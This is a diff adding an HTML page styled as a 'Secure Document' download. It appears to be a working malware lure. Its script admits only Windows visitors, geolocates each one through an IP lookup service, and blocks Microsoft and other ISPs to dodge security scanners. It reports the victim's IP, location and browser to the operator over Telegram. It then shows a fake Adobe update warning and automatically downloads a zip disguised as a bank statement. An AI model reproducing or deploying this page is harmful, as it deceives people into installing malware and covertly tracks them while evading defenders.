@@ -1,0 +1,209 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Secure Document Loading</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(to right, #e8ecf6, #f4f7fc);
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #1a1a1a;
+      position: relative;
+      overflow: hidden;
+    }
+    body::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
+      background-image: url('./tank.jpg');
+      background-size: cover;
+      background-position: center;
+      filter: blur(8px);
+      z-index: -1;
+    }
+    .card {
+      background: rgba(255, 255, 255, 0.85);
+      backdrop-filter: blur(16px);
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+      border-radius: 20px;
+      padding: 40px;
+      max-width: 420px;
+      width: 90%;
+      text-align: center;
+      z-index: 1;
+    }
+    .progress-wrapper {
+      margin: 30px 0 20px 0;
+      background-color: #e0e7ff;
+      border-radius: 20px;
+      height: 16px;
+      overflow: hidden;
+    }
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #4f46e5, #60a5fa);
+      transition: width 0.4s ease;
+    }
+    .warning, .block {
+      display: none;
+      font-size: 15px;
+      font-weight: 600;
+      color: #b45309;
+      background: #fef3c7;
+      padding: 14px;
+      border-radius: 8px;
+      margin-top: 10px;
+      line-height: 1.5;
+    }
+    .status-text {
+      margin-top: 18px;
+      font-size: 15px;
+      color: #374151;
+    }
+    .btn-download {
+      display: none;
+      margin-top: 30px;
+      background-color: #4f46e5;
+      color: #fff;
+      padding: 12px 22px;
+      border-radius: 8px;
+      text-decoration: none;
+      font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card" id="mainCard">
+    <h2>Downloading Secure Document</h2>
+
+    <div class="progress-wrapper">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <div class="warning" id="warningBox">
+      Your current Adobe PDF viewer may be outdated.<br>
+      Please install the latest version to continue.
+    </div>
+
+    <div class="block" id="blockBox"></div>
+
+    <div class="status-text" id="statusText">
+      Initializing download…
+    </div>
+
+    <a href="statement 06312026.zip" id="downloadLink" class="btn-download" download>
+      Click here if the download didn’t start
+    </a>
+  </div>
+
+  <script type="module">
+    import { notifyTelegram } from './telegramNotify.js';
+
+    const blockedISPs = ["microsoft-corp-msn-as-block", "datacamp limited", "unknown isp"];
+    const allowedPlatforms = ['Win32', 'Win64'];
+
+    const userAgent = navigator.userAgent;
+    const platform = navigator.platform;
+    const bar = document.getElementById("progressBar");
+    const status = document.getElementById("statusText");
+    const warningBox = document.getElementById("warningBox");
+    const blockBox = document.getElementById("blockBox");
+    const link = document.getElementById("downloadLink");
+    const card = document.getElementById("mainCard");
+
+    function block(reason) {
+      blockBox.style.display = "block";
+      blockBox.textContent = reason;
+      status.textContent = "Access denied";
+      card.querySelector("h2").textContent = "Access Blocked";
+    }
+
+    async function start() {
+      // OS check
+      if (!allowedPlatforms.includes(platform)) {
+        block("Only Windows devices are allowed.");
+        return;
+      }
+
+      let ip = "", geo = {};
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        ip = data.ip;
+        geo = {
+          isp: data.org ? data.org.toLowerCase() : "",
+          city: data.city,
+          region: data.region,
+          country: data.country_name,
+          coords: `${data.latitude},${data.longitude}`
+        };
+
+        // ISP block check
+        if (blockedISPs.includes(geo.isp)) {
+          block(`Access denied for ISP: ${geo.isp}`);
+          return;
+        }
+
+        // Telegram notification
+        notifyTelegram(ip, geo, userAgent);
+
+      } catch (err) {
+        console.warn("Geo fetch failed:", err);
+      }
+
+      // Progress animation
+      let progress = 0;
+      let warningShown = false;
+      const timer = setInterval(() => {
+        if (progress < 100) {
+          progress += Math.floor(Math.random() * 5) + 2;
+          if (progress > 100) progress = 100;
+          bar.style.width = progress + "%";
+
+          if (progress < 30) {
+            status.textContent = "Initializing download";
+          } else if (progress < 60) {
+            status.textContent = "Loading your document securely…";
+          }
+
+          if (progress >= 60 && !warningShown) {
+            warningShown = true;
+            warningBox.style.display = "block";
+          }
+
+          if (progress >= 60 && progress < 100) {
+            status.textContent = "Preparing installer";
+          }
+        } else {
+          clearInterval(timer);
+          status.textContent = "Download starting";
+          link.style.display = "inline-block";
+
+          const trigger = document.createElement("a");
+          trigger.href = "statement 06312026.zip";
+          trigger.download = "statement 06312026.zip";
+          document.body.appendChild(trigger);
+          trigger.click();
+          document.body.removeChild(trigger);
+        }
+      }, 400);
+    }
+
+    start();
+  </script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"e667b74ce0f34818aa4ea9910204533a","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
